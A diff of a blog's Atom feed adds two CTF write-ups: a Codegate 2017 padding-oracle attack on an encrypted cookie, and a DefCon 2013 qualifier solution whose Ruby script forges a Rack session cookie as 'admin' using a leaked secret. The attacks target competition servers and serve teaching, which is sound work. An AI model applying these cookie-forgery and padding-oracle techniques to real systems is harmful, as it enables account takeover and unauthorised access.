@@ -4,7 +4,7 @@
   <title><![CDATA[Category: ctf | xelz's blog]]></title>
   <link href="http://xelz.info/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://xelz.info/"/>
-  <updated>2017-03-16T04:14:56+00:00</updated>
+  <updated>2017-02-20T18:34:01+00:00</updated>
   <id>http://xelz.info/</id>
   <author>
     <name><![CDATA[xelz]]></name>
@@ -12,6 +12,272 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Codegate 2017 2D Life writeup]]></title>
+    <link href="http://xelz.info/blog/2017/02/20/codegate-2017-2d-life-writeup/"/>
+    <updated>2017-02-20T20:00:00+00:00</updated>
+    <id>http://xelz.info/blog/2017/02/20/codegate-2017-2d-life-writeup</id>
+    <content type="html"><![CDATA[<h3>Description</h3>
+
+<h4>2D Life</h4>
+
+<p>470 points</p>
+
+<p><code>
+http://110.10.212.135:24135
+http://110.10.212.135:24136
+http://110.10.212.147:24135
+http://110.10.212.147:24136
+</code></p>
+
+<p>I didn&rsquo;t have enough time to solve this challenge since I&rsquo;m busy at work. It&rsquo;s a pity that my team didn&rsquo;t, neither. But I have to say it&rsquo;s a very challenging one. Combination of crypto and SQL injection.</p>
+
+<h3>First Sight</h3>
+
+<p>It seemed to be a web challenge because the entrance was a website. So let&rsquo;s start with HTTP requests and responses. In the source code of the page, a path to secret login page was commented.</p>
+
+<p>```html</p>
+
+<div id="navbar" class="navbar-collapse collapse">
+  <ul class="nav navbar-nav">
+  <li><a href="http://xelz.info/">Home</a></li>
+  <li><a href="?p=pic">Pictures</a></li>
+  <li><a href="?p=music">Music</a></li>
+  <li><a href="?p=contact">Contact</a></li>
+  <!--<li><a href="?p=secret_login">Login</a><li>-->
+  </ul>
+</div>
+
+
+<p>```</p>
+
+<p>The login page set a cookie like this(using <a href="https://httpie.org/">httpie</a>)</p>
+
+<p><code>
+$ http http://110.10.212.135:24135/\?p\=secret_login
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Encoding: gzip
+Content-Length: 579
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 10 Feb 2017 05:57:50 GMT
+Keep-Alive: timeout=5, max=100
+Server: Apache/2.4.18 (Ubuntu)
+Set-Cookie: identify=t93ZpEcFoz4%3D%7C6uDGkD5VtEk0H9kAOzOrQECDzRdVuuDYn4h8ISoWSUuetH5Cb%2BBgSfxSd9WfX9RxHGC7cnAZdnmxqneZrLkQ%2Bw%3D%3D
+Vary: Accept-Encoding
+</code></p>
+
+<p>It&rsquo;s easy to say that the cookie is two parts of base64 encoded string concatenated by a <code>|</code>.</p>
+
+<p><code>
+t93ZpEcFoz4=|6uDGkD5VtEk0H9kAOzOrQECDzRdVuuDYn4h8ISoWSUuetH5Cb+BgSfxSd9WfX9RxHGC7cnAZdnmxqneZrLkQ+w==
+</code></p>
+
+<p>Different cookies was returned when repeating the same request. Modify the tail of the cookie will got a message <code>Error has occur from decrypt..</code>, but the head won&rsquo;t.</p>
+
+<!-- more -->
+
+
+<h3>Cryptography</h3>
+
+<p>Look at the two parts of cookie:</p>
+
+<p>```
+part 1: t93ZpEcFoz4=
+decode: b7 dd d9 a4 47 05 a3 3e
+length: 8</p>
+
+<p>part 2: 6uDGkD5VtEk0H9kAOzOrQECDzRdVuuDYn4h8ISoWSUuetH5Cb+BgSfxSd9WfX9RxHGC7cnAZdnmxqneZrLkQ+w==
+decode: ea e0 c6 90 3e 55 b4 49 34 1f d9 00 3b 33 ab 40 40 83 cd 17 55 ba e0 d8 9f 88 7c 21 2a 16 49 4b 9e b4 7e 42 6f e0 60 49 fc 52 77 d5 9f 5f d4 71 1c 60 bb 72 70 19 76 79 b1 aa 77 99 ac b9 10 fb
+length: 64
+```</p>
+
+<p>Now I believe it&rsquo;s a <code>Padding Oracle</code> Problem. I&rsquo;ve read about it in <em>Web Security by White Hats</em> (刺总的《白帽子讲Web安全》). <code>Part 1</code> is the 8 bytes <code>iv</code> of encryption, and <code>Part 2</code>, obviously is 8 blocks of encrypted data, with 8 bytes in each block.</p>
+
+<h4>CBC Mode</h4>
+
+<p>Every Block cipher can only deal with a message with fixed length (usually the same length as the key), so plain message is divided into several blocks and each block will be encrypted separately. To avoid data pattern sniffing, a vector is added befor encryption in CBC mode.</p>
+
+<p>```</p>
+
+<pre><code>             XOR
+</code></pre>
+
+<p>plain block &mdash;&ndash;> |+| &mdash;&ndash;> intermediate value &mdash;&ndash;> encrypted block</p>
+
+<pre><code>              ^                           ^
+            Vector                    encryption
+</code></pre>
+
+<p>```</p>
+
+<p>Vector of each plain data block is the encrypted data of previous block. The Initial Vector for the first data block is provided additionally.</p>
+
+<h4>PKCS#5 Padding</h4>
+
+<p>Length of every block must be exactly the same with the key. In this case, the length is 8 bytes. If there is less than 8 bytes(or just equal to 8 bytes) in the last block, a padding is introduced.</p>
+
+<p>```
+xx xx xx xx xx xx xx    &ndash;> xx xx xx xx xx xx xx 01
+xx xx xx xx xx xx       &ndash;> xx xx xx xx xx xx 02 02
+xx xx xx xx xx          &ndash;> xx xx xx xx xx 03 03 03
+xx xx xx xx             &ndash;> xx xx xx xx 04 04 04 04
+xx xx xx                &ndash;> xx xx xx 05 05 05 05 05
+xx xx                   &ndash;> xx xx 06 06 06 06 06 06
+xx                      &ndash;> xx 07 07 07 07 07 07 07
+xx xx xx xx xx xx xx xx &ndash;> xx xx xx xx xx xx xx xx</p>
+
+<pre><code>                       08 08 08 08 08 08 08 08
+</code></pre>
+
+<p>```</p>
+
+<p>While decrypting, cipher will check the value of the last byte in the decrypted message. Assume that value is 0x04, then check the value of the last 4 bytes. It will be fine if they all equal to 0x04 and the 4 bytes will be directly removed to recover the original length of plain message. Otherwise a decryption exception occured as I tried above.</p>
+
+<h4>Padding Oracle Attack</h4>
+
+<p>We know a bad padding format of the last block will cause exception, so if we craft a fake data which can make the padding match the right format, the data will be accepted by the server without throwing a decryption exception(This does not means it will be completely accepted by server without any other excpetions because the data is totally a mess). At this moment we know the last few bytes in the decrypted message,  is one of the padding format.</p>
+
+<p>We&rsquo;ve got last bytes of plain block and the vector(we craft it), so we can get the last bytes of intermediate value of the corresponding encrypted block by</p>
+
+<p><code>
+intermediate value  =  plain block with padding  (xor)  craft vector
+</code></p>
+
+<p>and then, the real plain block</p>
+
+<p><code>
+plain block = intermediate value  (xor)  actual vector
+</code></p>
+
+<p>To make it clear, we can brute force every byte in a block, from the last byte to the first one.</p>
+
+<p><code>
+|            iv: b7 dd d9 a4 47 05 a3 3e
+|encrypted data: ea e0 c6 90 3e 55 b4 49
+|                34 1f d9 00 3b 33 ab 40
+|                40 83 cd 17 55 ba e0 d8
+|                9f 88 7c 21 2a 16 49 4b
+|                9e b4 7e 42 6f e0 60 49
+|                fc 52 77 d5 9f 5f d4 71
+|                1c 60 bb 72 70 19 76 79
+|                b1 aa 77 99 ac b9 10 fb
+</code></p>
+
+<p>Start with the first block <code>ea e0 c6 90 3e 55 b4 49</code>, enumerate the last byte of iv, from 0x00 to 0xFF.</p>
+
+<p><code>
+|               iv : ff ff ff ff ff ff ff 00
+|       iv encoded : /////////wA=
+|encrypted message : ea e0 c6 90 3e 55 b4 49
+|  message encoded : 6uDGkD5VtEk=
+|           cookie : /////////wA=|6uDGkD5VtEk=
+</code></p>
+
+<p>visit secure login page with the fake cookie:</p>
+
+<p><code>
+$ http '110.10.212.135:24135/?p=secret_login' cookie:'identity=/////////wA=|6uDGkD5VtEk='
+</code></p>
+
+<p>got the message <code>Error has occur from decrypt..</code></p>
+
+<p>continue trying with different iv(this can be done with a piece of script)</p>
+
+<p><code>
+ff ff ff ff ff ff ff 01
+ff ff ff ff ff ff ff 02
+...
+ff ff ff ff ff ff ff 1f
+...
+</code></p>
+
+<p>a different message showed up when trying <code>0x1f</code> as the last byte in iv.</p>
+
+<p><code>
+Is that all? HACKER?
+</code></p>
+
+<p>BINGO!  It means the padding is 0x01 now(not quite), more clearly, the last byte of the plain message is 0x01.</p>
+
+<p>PS: If the second to last byte in the plain message just happen to be 0x02, then the last byte may be 0x02, too. Both 0x01 and 0x02 are valid at this situation. Just change the last 0xff in iv to any other value and try again, which will break the combination of  <code>0x02 0x02</code> padding (into <code>0x?? 0x02</code>). If nothing different with 0xff(no decrypt error occuring), 0x01 is the right answer.</p>
+
+<p>the last byte of intermediate value can be calculated by</p>
+
+<p>```
+intermediate value = iv   (xor)   plain message</p>
+
+<pre><code>    1e         = 1f    (+)         01
+</code></pre>
+
+<p>```</p>
+
+<p>and then calculate the last byte of original plain message by the original iv</p>
+
+<p>```
+plain message = iv   (xor)   intermediate value</p>
+
+<pre><code>  20      = 3e    (+)           1e
+</code></pre>
+
+<p>```</p>
+
+<p>The last byte of the first plain block is <code>0x20</code>!</p>
+
+<p>Next byte, we need to make the plain message have a value of 0x02 in the last byte, to test the <code>0x02 0x02</code> padding. So last byte of iv must be <code>0x02 (+) 0x1e = 0x1c</code></p>
+
+<p>Trying like this</p>
+
+<p><code>
+ff ff ff ff ff ff 00 1c
+ff ff ff ff ff ff 01 1c
+ff ff ff ff ff ff 02 1c
+...
+ff ff ff ff ff ff ff 1c
+</code></p>
+
+<p><code>ff ff ff ff ff ff e4 1c</code> will make the sense.  <code>0xe4 (+) 0x02 (+) 0xa3 = 0x45</code></p>
+
+<p>Finally we can get the first block:</p>
+
+<p><code>
+|                iv : b7 dd d9 a4 47 05 a3 3e
+|intermediate value : fa 98 8a f7 06 42 e6 1e
+|     plain message : 4d 45 53 53 41 47 45 20
+|        plain text : M  E  S  S  A  G  E  
+</code></p>
+
+<p>Continue with the next block:</p>
+
+<p><code>
+34 1f d9 00 3b 33 ab 40
+</code></p>
+
+<p>Notice that the original vector of this block is the previous enctyped block <code>ea e0 c6 90 3e 55 b4 49</code>, not the iv.</p>
+
+<p>After all the entire message came out:</p>
+
+<p><code>
+MESSAGE FROM SPY&lt;!--TABLE:agents NUMBER OF COLUMNS:5--&gt;;SPY;66
+</code></p>
+
+<h3>SQL Injection</h3>
+
+<p>We didn&rsquo;t got the flag but a hint</p>
+
+<p><code>
+Table: agents
+columns: 5
+</code></p>
+
+<p>It should be a SQL injection attack.</p>
+
+<p>I dinn&rsquo;t solve this until the server was shut down. TAT</p>
+
+<p><a href="http://crypto.rop.sh/post/71CBLOYIN034">Writeup by cnc</a></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Write Up of a Very Interesting Wargame]]></title>
@@ -339,6 +605,241 @@ ifconfig
 Open it in Firefox and then successfully we can get the CCTV admin page.</p>
 
 <p>Try to login with someone&rsquo;s name as the password.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DefCon CTF Qualifier 2013 3dub 3 Write Up]]></title>
+    <link href="http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up/"/>
+    <updated>2013-06-28T12:00:00+00:00</updated>
+    <id>http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up</id>
+    <content type="html"><![CDATA[<p>mirror of <a href="http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/">http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/</a></p>
+
+<p>First of all, we got a <code>secrets</code> link and <code>log in or create user</code> form. When we create and login, the website redirect us to the &lsquo;secrets&rsquo; page like this</p>
+
+<blockquote><p>Secrets</p>
+
+<p>name owner actions</p>
+
+<p>key admin <a href="#">show</a></p>
+
+<p>nothing asdf <a href="#">show</a></p>
+
+<p><a href="#">new secret</a></p></blockquote>
+
+<p>we&rsquo;ve got some links to see secrets owned by other users, include the <code>admin</code>, or easily add a new secret ourselves.</p>
+
+<p>Having a try to open the admin&rsquo;s secret, we got a 500 Error Page with some error stack, which powered by the Ruby framework <code>Sinatra</code>.</p>
+
+<p>From the very first sight of the page, it said <code>unauthorized</code> as the error message and a piece of source code was provided</p>
+
+<p>``` ruby</p>
+
+<pre><code>end
+
+redirect '/secrets'
+</code></pre>
+
+<p>end</p>
+
+<p>get &lsquo;/secrets/:id&rsquo; do</p>
+
+<pre><code>s = SECRETS[params[:id].to_i]
+</code></pre>
+
+<p>raise &ldquo;unauthorized&rdquo; if session[:user_name] != s.username</p>
+
+<p>haml :secret, locals: {secret: s}
+end</p>
+
+<p>helpers do</p>
+
+<pre><code>def current_user
+    return nil unless session[:user_name]
+</code></pre>
+
+<p>```</p>
+
+<!-- more -->
+
+
+<p>It meant that I&rsquo;m not the secret&rsquo;s holder. then have a look at the whole page, and you would find some environment variable in the <code>Rack ENV</code> section, partly like</p>
+
+<ul>
+<li>rack.session</li>
+</ul>
+
+
+<p><code>ruby
+{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}
+</code></p>
+
+<ul>
+<li>rack.session.options</li>
+</ul>
+
+
+<p><code>ruby
+{:path=&gt;"/", :domain=&gt;nil, :expire_after=&gt;nil, :secure=&gt;false, :httponly=&gt;true, :defer=&gt;false, :renew=&gt;false, :sidbits=&gt;128, :secure_random=&gt;SecureRandom, :secret=&gt;"wroashsoxDiculReejLykUssyifabEdGhovHabno", :coder=&gt;#}
+</code></p>
+
+<ul>
+<li>rack.session.unpacked_cookie_data</li>
+</ul>
+
+
+<p><code>ruby
+{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}
+</code></p>
+
+<ul>
+<li>rack.request.cookie_hash</li>
+</ul>
+
+
+<p><code>ruby
+{"rack.session"=&gt;"BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n--d637305e23d6693f3ebe276b292293c7ff0b72e6"}
+</code></p>
+
+<p>we&rsquo;ve got some message:</p>
+
+<p>the cookie <code>rack.session</code> is some way encoded of <code>rack.session.unpacked_cookie_data</code>, which is totally the same as env variable rack.session, and the coder mybe <code>Rack::Session::Cookie::Base64::Marshal</code>, secret (if any) maybe <code>wroashsoxDiculReejLykUssyifabEdGhovHabno</code></p>
+
+<p>By seeking the source code of rack, we found this <a href="https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb">https://github.com/rack/</a></p>
+
+<p>``` ruby</p>
+
+<pre><code>@secrets = options.values_at(:secret, :_old_secret).compact
+# some code else
+session_data = coder.encode(session)
+if @secrets.first
+    session_data &lt;&lt; "--#{generate_hmac(session_data, @secrets.first)}"
+end 
+# some code else
+def generate_hmac(data, secret)
+    OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
+end
+</code></pre>
+
+<p>```</p>
+
+<p>Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch</p>
+
+<p>``` ruby
+if @secrets.size > 0 &amp;&amp; session_data</p>
+
+<pre><code>session_data, digest = session_data.split("--")
+session_data = nil unless digest_match?(session_data, digest)
+</code></pre>
+
+<p>end
+```</p>
+
+<p>Meanwhile, we knew the whole process of the session checking. thus, I&rsquo;ve wrote a ruby script to figure out this stuff with this way</p>
+
+<ul>
+<li><code>unpack(decode)</code> the cookie to origin session data</li>
+<li>modify session_data.user_name to <code>admin</code></li>
+<li><code>repack(encode)</code> the session data to cookie string format</li>
+<li>calculate a new digest of the session data then build the cookie</li>
+</ul>
+
+
+<h3>code</h3>
+
+<p>``` ruby</p>
+
+<h1>!/usr/bin/ruby</h1>
+
+<h1>Author: xelz@blue-lotus</h1>
+
+<p>require &lsquo;openssl&rsquo;</p>
+
+<h1>part of rack/lib/rack/session/cookie.rb</h1>
+
+<p>class Base64</p>
+
+<pre><code>def encode(str)
+    [str].pack('m')
+end
+
+def decode(str)
+    str.unpack('m').first
+end
+
+# Encode session cookies as Marshaled Base64 data
+class Marshal &lt; Base64
+    def encode(str)
+        super(::Marshal.dump(str))
+    end
+
+    def decode(str)
+        return unless str
+        ::Marshal.load(super(str)) rescue nil
+    end
+end
+</code></pre>
+
+<p>end</p>
+
+<p>def generate_hmac(data, secret)</p>
+
+<pre><code>OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
+</code></pre>
+
+<p>end</p>
+
+<p>exit() unless ARGV[0]</p>
+
+<p>data = ARGV[0].split(&lsquo;&mdash;&rsquo;)[0]</p>
+
+<h1>puts &lsquo;data is:&rsquo;</h1>
+
+<h1>puts data, &ldquo;\n&rdquo;</h1>
+
+<p>coder = Base64::Marshal.new
+data = coder.decode(data)
+data[&lsquo;user_name&rsquo;] = &ldquo;admin&rdquo;
+data = coder.encode(data)</p>
+
+<h1>puts &lsquo;modified data is:&rsquo;</h1>
+
+<h1>puts data, &ldquo;\n&rdquo;</h1>
+
+<p>data = data</p>
+
+<p>secret = &lsquo;wroashsoxDiculReejLykUssyifabEdGhovHabno&rsquo;</p>
+
+<h1>puts &lsquo;new digest string is:&rsquo;</h1>
+
+<p>digest = generate_hmac(data, secret)</p>
+
+<h1>puts digest, &ldquo;\n&rdquo;</h1>
+
+<p>puts &lsquo;cookie is&rsquo;
+cookie = data.gsub(&ldquo;\n&rdquo;, &ldquo;%0A&rdquo;) + &lsquo;&mdash;&rsquo; + digest
+puts cookie
+```</p>
+
+<p>run the script like this:</p>
+
+<p><code>bash
+xelz@blue-lotus:defconctf$echo -en 'BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n' | awk '{print $1"\\"}' | xargs ./hypeman.rb
+cookie is
+BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4=%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
+</code></p>
+
+<p>then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I&rsquo;d like to use the Javascript Console in Chrome:</p>
+
+<p><code>javascript
+document.cookie='rack.session=xxx;'
+</code></p>
+
+<p>refresh the page, and enjoy :)</p>
+
+<h3>key</h3>
+
+<blockquote><p>watch out for this Etdeksogav</p></blockquote>
 ]]></content>
   </entry>
   
